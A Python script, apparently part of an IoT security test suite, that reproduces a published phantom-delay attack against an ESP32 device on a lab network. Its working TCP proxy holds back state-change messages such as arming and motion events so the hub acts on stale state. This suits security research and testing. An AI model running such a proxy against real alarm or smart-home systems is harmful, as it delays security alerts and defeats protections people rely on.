#!/usr/bin/env python3
"""
VESPER ESP32 — Suite 3: Relay / Phantom-Delay Attack
=====================================================
Reproduces Fu et al., "IoT Phantom-Delay Attacks: Demystifying and Exploiting
IoT Timeout Behaviors", IEEE/IFIP DSN 2022.

A transparent TCP proxy sits between the hub and the ESP32:
  • Commands  (hub → ESP32) are forwarded INSTANTLY — the hub feels no lag.
  • Responses (ESP32 → hub) that carry state changes (ARMED:, SWITCH:,
    EVENT:MOTION, OVERFLOW:) are HELD for `delay_s` seconds before delivery.

The hub's world-model is therefore STALE for the entire hold window.
Any automation rule that evaluates device state during that window reads
the wrong value and makes the wrong decision.

  CWE  : CWE-362 — Race Condition (Time-of-check to time-of-use)
  CVSS : 9.3 (Critical)

Run standalone:
    python scripts/attacks/relay.py --target 192.168.1.112:15011
    python scripts/attacks/relay.py --target 192.168.1.112:15011 --delay 8
"""

import argparse
import socket
import sys
import threading
import time
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from scripts.attacks.common import (
    GREEN, RED, YELLOW, MAGENTA, DIM, BOLD, RESET,
    reset_clock, _ts, tx, rx, state_box, section, divider, progress_bar,
    verify_connection, print_result,
)


# ── transparent delay proxy ───────────────────────────────────────────────────

class _DelayProxy(threading.Thread):
    """
    Transparent TCP proxy that selectively delays ESP32 → hub messages.

    Commands (hub → ESP32) pass through instantly on a background thread.
    Responses (ESP32 → hub) are inspected: if any DELAY_KEYWORD is present
    the message is held for `delay_s` seconds before forwarding.
    """

    DELAY_KEYWORDS = [b"ARMED:", b"SWITCH:", b"EVENT:MOTION", b"OVERFLOW:", b"MOTION:"]

    def __init__(self, listen_port: int, target_host: str, target_port: int,
                 delay_s: float):
        super().__init__(daemon=True)
        self.listen_port  = listen_port
        self.target_host  = target_host
        self.target_port  = target_port
        self.delay_s      = delay_s
        self.intercepted: list = []
        self.stats        = {"forwarded": 0, "delayed": 0, "total_delay_s": 0.0}
        self._srv: Optional[socket.socket] = None
        self._stop        = threading.Event()

    def run(self):
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.settimeout(1.0)
        self._srv.bind(("127.0.0.1", self.listen_port))
        self._srv.listen(1)
        while not self._stop.is_set():
            try:
                client, _ = self._srv.accept()
                threading.Thread(target=self._pipe, args=(client,), daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break

    def _pipe(self, client: socket.socket):
        try:
            esp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            esp.settimeout(self.delay_s + 10)
            esp.connect((self.target_host, self.target_port))
        except Exception:
            client.close()
            return

        def hub_to_esp():
            """Forward hub commands to ESP32 with no delay."""
            while not self._stop.is_set():
                try:
                    data = client.recv(4096)
                    if not data:
                        break
                    esp.sendall(data)
                except Exception:
                    break

        def esp_to_hub():
            """Forward ESP32 responses to hub, holding state-change messages."""
            while not self._stop.is_set():
                try:
                    data = esp.recv(4096)
                    if not data:
                        break
                    if any(kw in data for kw in self.DELAY_KEYWORDS):
                        self.stats["delayed"]       += 1
                        self.stats["total_delay_s"] += self.delay_s
                        self.intercepted.append({
                            "msg":     data.decode("utf-8", errors="replace").strip(),
                            "delay_s": self.delay_s,
                        })
                        time.sleep(self.delay_s)       # ← THE HOLD
                    else:
                        self.stats["forwarded"] += 1
                    client.sendall(data)
                except Exception:
                    break

        threading.Thread(target=hub_to_esp, daemon=True).start()
        esp_to_hub()
        client.close()
        esp.close()

    def stop(self):
        self._stop.set()
        if self._srv:
            try:
                self._srv.close()
            except Exception:
                pass


# ── attack function ───────────────────────────────────────────────────────────

def attack_relay_phantom_delay(host: str, port: int, delay_s: float = 5.0) -> dict:
    """
    Start a _DelayProxy on localhost, connect through it, send ARM, and
    measure how long the hub has to wait for the ARMED:yes confirmation.
    The stale-state window equals the measured delay.
    """
    proxy_port = 16011
    section(
        "Suite 3 — RELAY / PHANTOM-DELAY ATTACK  (Fu et al. DSN 2022)",
        f"Proxy: 127.0.0.1:{proxy_port} → {host}:{port}  |  Delay: {delay_s:.0f}s  |  CWE-362 / CVSS 9.3",
    )

    print(f"  How it works:")
    print(f"  {DIM}  Commands (HUB → ESP32) pass through the proxy {BOLD}instantly{RESET}{DIM}.{RESET}")
    print(f"  {DIM}  State-change responses (ARMED: SWITCH: MOTION:) are held {delay_s:.0f}s.{RESET}")
    print(f"  {DIM}  The hub's world-model is STALE for {delay_s:.0f}s — automations{RESET}")
    print(f"  {DIM}  fire late or read the wrong state entirely.{RESET}\n")

    evidence: list  = []
    observed_delay  = 0.0

    # ── Step 1: start proxy ───────────────────────────────────────────────────
    divider("Step 1 — Start transparent TCP proxy")
    proxy = _DelayProxy(proxy_port, host, port, delay_s)
    proxy.start()
    time.sleep(0.3)
    print(f"  {_ts()}{GREEN}Proxy listening:{RESET}  127.0.0.1:{proxy_port}")
    print(f"  {_ts()}{GREEN}Upstream target:{RESET}  {host}:{port}")
    print(f"  {_ts()}{YELLOW}Delay filter:{RESET}     ARMED:  SWITCH:  EVENT:MOTION  OVERFLOW:")
    evidence.append(f"Proxy active: 127.0.0.1:{proxy_port} → {host}:{port}")
    evidence.append(f"Intercepting: ARMED:, SWITCH:, EVENT:MOTION, OVERFLOW:")

    t0 = time.time()
    try:
        # ── Step 2: connect through proxy ────────────────────────────────────
        print()
        divider("Step 2 — Hub connects through proxy (hub sees normal banner)")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(delay_s + 8)
        sock.connect(("127.0.0.1", proxy_port))
        time.sleep(0.2)
        banner = b""
        try:
            banner = sock.recv(1024)
        except socket.timeout:
            pass
        rx(banner.decode("utf-8", errors="replace"), "proxy→HUB (not delayed)")
        print(f"  {DIM}Banner passes through instantly — hub cannot tell a proxy is present.{RESET}")

        # ── Step 3: send ARM ─────────────────────────────────────────────────
        print()
        divider("Step 3 — Hub sends ARM through proxy")
        tx("ARM", via=f"proxy @ 127.0.0.1:{proxy_port}")
        t_send = time.time()
        sock.sendall(b"ARM\n")
        print(f"  {DIM}→ proxy forwarded ARM to ESP32 instantly{RESET}")
        print(f"  {DIM}← ESP32 responded ARMED:yes immediately (proxy captures and holds it){RESET}")

        # Background thread collects the (delayed) response
        resp_container = [b""]
        recv_done      = threading.Event()

        def _recv_thread():
            deadline = time.time() + delay_s + 8
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp_container[0] += chunk
                    if b"ACK" in resp_container[0] or b"ARMED" in resp_container[0]:
                        break
                except socket.timeout:
                    break
            recv_done.set()

        recv_t = threading.Thread(target=_recv_thread, daemon=True)
        recv_t.start()

        # ── Live progress bar during the hold ────────────────────────────────
        print()
        print(f"  {YELLOW}⏳  Proxy intercepted ARMED:yes response — holding for {delay_s:.0f}s ...{RESET}")
        print(f"  {RED}    Hub world-model: {BOLD}[ DISARMED 🔴 ]{RESET}{RED}  ← STALE  (device is actually ARMED){RESET}\n")
        bar_start = time.time()
        while not recv_done.is_set():
            elapsed = time.time() - bar_start
            bar     = progress_bar(elapsed, delay_s)
            print(f"\r  {MAGENTA}{bar}{RESET}  {DIM}hub sees: DISARMED{RESET}   ", end="", flush=True)
            time.sleep(0.1)
            if elapsed > delay_s + 2:
                break
        print()   # end progress-bar line

        recv_t.join(timeout=2.0)
        observed_delay = time.time() - t_send
        resp           = resp_container[0].decode("utf-8", errors="replace")
        sock.close()

        # ── Step 4: response delivered ────────────────────────────────────────
        print()
        divider(f"Step 4 — Response delivered to hub after {observed_delay:.1f}s")
        rx(resp, "proxy→HUB (released after delay)")
        state_box("ARMED")
        print(f"  {RED}⚠  Stale-state window was {observed_delay:.1f}s{RESET}")
        print(f"  {DIM}   Automation rules that ran during those {observed_delay:.1f}s saw DISARMED (incorrect).{RESET}\n")

        evidence.append("ARM sent at t=0")
        evidence.append(
            f"ARMED:yes arrived after {observed_delay:.1f}s  "
            f"(proxy held it {delay_s}s) — hub world-model stale for {delay_s}s"
        )
        for item in proxy.intercepted[:3]:
            evidence.append(
                f"Intercepted+delayed: '{item['msg'][:60]}'  +{item['delay_s']:.0f}s"
            )
        evidence.append(
            f"Any automation that checked 'is armed?' during the {delay_s:.0f}s gap "
            "saw stale state and made wrong decisions"
        )

    except Exception as e:
        evidence.append(f"Error: {e}")
    finally:
        proxy.stop()

    duration_ms = (time.time() - t0) * 1000
    success     = (proxy.stats["delayed"] > 0) or (observed_delay >= delay_s * 0.7)

    return {
        "name":        "Relay / Phantom-Delay (TCP proxy, Fu et al. DSN 2022)",
        "suite":       "Relay/Phantom-Delay",
        "severity":    "CRITICAL",
        "success":     success,
        "evidence":    evidence,
        "duration_ms": duration_ms,
        "impact": (
            f"State events delayed {delay_s:.0f}s — automation fires {delay_s:.0f}s late. "
            "Motion alerts arrive after intruder escapes. Security system bypassed."
        ),
        "cvss": 9.3,
    }


def main():
    parser = argparse.ArgumentParser(
        description="VESPER ESP32 — Suite 3: Relay / Phantom-Delay Attack"
    )
    parser.add_argument("--target", required=True,
                        help="ESP32 address, e.g. 192.168.1.112:15011")
    parser.add_argument("--delay", type=float, default=5.0,
                        help="Seconds to hold state-change responses (default: 5)")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip connection check")
    args = parser.parse_args()

    parts = args.target.split(":")
    host  = parts[0]
    port  = int(parts[1]) if len(parts) > 1 else 15011

    reset_clock()
    print(f"\n{'='*60}")
    print(f"  Suite 3 — Relay/Phantom-Delay Attack  |  {host}:{port}")
    print(f"{'='*60}\n")

    if not args.no_verify and not verify_connection(host, port):
        print("Cannot reach ESP32.\n")
        return 1

    result = attack_relay_phantom_delay(host, port, delay_s=args.delay)
    print_result(result)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
